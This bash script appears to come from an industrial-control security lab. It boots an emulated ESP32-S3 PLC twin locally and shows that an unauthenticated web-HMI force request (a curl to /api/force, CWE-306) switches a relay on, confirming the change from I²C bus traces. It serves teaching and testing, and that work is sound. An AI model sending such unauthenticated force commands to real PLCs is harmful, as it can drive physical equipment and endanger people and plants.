#!/usr/bin/env bash
# chain_demo.sh — prove the whole chain in one run:
#   unauthenticated network write (no auth — CWE-306)  ->  PLC scan (logic)
#   ->  AW9523 relay-register write on the I²C bus (0x59)  ->  relay actuates.
# Shows the SAME I²C bus the bus lab decodes carrying the consequence of a network write.
#
# Mechanism note (important, and a real ICS concept): a raw Modbus coil write to a
# relay is ACCEPTED unauthenticated (CWE-306) and logged, but the PLC scan reasserts
# output coils from the program every cycle — so the coil write alone does NOT move
# the relay. The physical relay follows the program output or a FORCE. This demo uses
# the unauthenticated web-HMI force (:8080 /api/force — the same no-auth exposure) to
# actuate relay0 and show the resulting 0x59 bus write.
#
# Needs the fetched twin (../../qemu/fetch-qemu.sh). Runs its OWN twin on 127.0.0.2,
# on a throwaway image copy, so it is safe even if ./qemu/run.sh (Step 0) is up.
set -uo pipefail
HERE="$(cd "$(dirname "$0")" && pwd)"; ROOT="$(cd "$HERE/../.." && pwd)"; TWIN="$ROOT/qemu/twin"
case "$(uname -s)/$(uname -m)" in
  Linux/x86_64)  B="$TWIN/qemu-twin-linux-x86_64";;
  Linux/aarch64) B="$TWIN/qemu-twin-linux-arm64";;
  Darwin/arm64)  B="$TWIN/qemu-twin-macos-arm64";;
  *) B="";;
esac
QEMU="${QEMU:-$B/qemu-system-xtensa}"; PCB="${PCB:-$B/pc-bios}"; IMG="${FLASH_IMG:-$TWIN/stamplc-flash-8MB.bin}"
[ -x "$QEMU" ] && [ -f "$IMG" ] || { echo "twin not fetched — run ./qemu/fetch-qemu.sh"; exit 1; }
python3 -c "import socket" 2>/dev/null || { echo "python3 required"; exit 1; }
BIND="${BIND:-127.0.0.2}"

SER="$(mktemp -u)"; TRACE="$(mktemp)"; WORKIMG="$(mktemp -u)-chain.bin"; cp "$IMG" "$WORKIMG"
QPID=0; trap 'kill "$QPID" 2>/dev/null || true; rm -f "$TRACE" "$WORKIMG"' EXIT
env TBD_W5_BIND="$BIND" \
  "$QEMU" -L "$PCB" -M esp32s3 -m 8M -drive file="$WORKIMG",if=mtd,format=raw \
  --trace enable=esp32_i2c_observe -D "$TRACE" -icount shift=4,sleep=on \
  -serial null -serial null -serial "unix:$SER,server=on,wait=off" -nographic -monitor none -no-reboot &
QPID=$!
# wait for boot
python3 - "$SER" <<'PY'
import socket,time,os,sys
sock=sys.argv[1]; s=None; d=time.time()+30; buf=b""
while time.time()<d:
    if s is None and os.path.exists(sock):
        try: s=socket.socket(socket.AF_UNIX); s.connect(sock); s.setblocking(False)
        except: s=None
    if s:
        try: buf+=s.recv(65536) or b""
        except BlockingIOError: pass
        except: pass
    if b"plc>" in buf: break
    time.sleep(0.05)
print("boot","ok" if b"plc>" in buf else "no-prompt")
PY
sleep 1; curl -s -m4 "http://$BIND:8080/api/mode?set=run" >/dev/null 2>&1 || true; sleep 1
awkq='/esp32_i2c_observe/{for(i=1;i<=NF;i++){n=index($i,"=");if(n){k=substr($i,1,n-1);v=substr($i,n+1);if(k=="event")e=v;if(k=="address")a=v;if(k=="data")d=v}} if(a=="89"&&e=="write")print "W 0x59 data="d}'
echo "I²C relay-register writes BEFORE (relays off):"; awk "$awkq" "$TRACE" | tail -2
echo "--- unauthenticated write (no auth — CWE-306): force relay0 ON via the web HMI ---"
echo "    curl 'http://$BIND:8080/api/force?tag=relay0&val=1&on=1'"
curl -s -m4 "http://$BIND:8080/api/force?tag=relay0&val=1&on=1" >/dev/null 2>&1 \
  && echo "  force relay0=1: accepted (no credential required)" || echo "  force relay0=1: err"
sleep 2; kill "$QPID" 2>/dev/null || true; wait "$QPID" 2>/dev/null || true; QPID=0
echo "I²C relay-register writes AFTER (bit0 set — relay0 actuated):"; awk "$awkq" "$TRACE" | tail -4
echo "→ the same W 0x59 transaction a bench logic analyzer would capture; decode with trace_to_sigrok.py + sigrok."
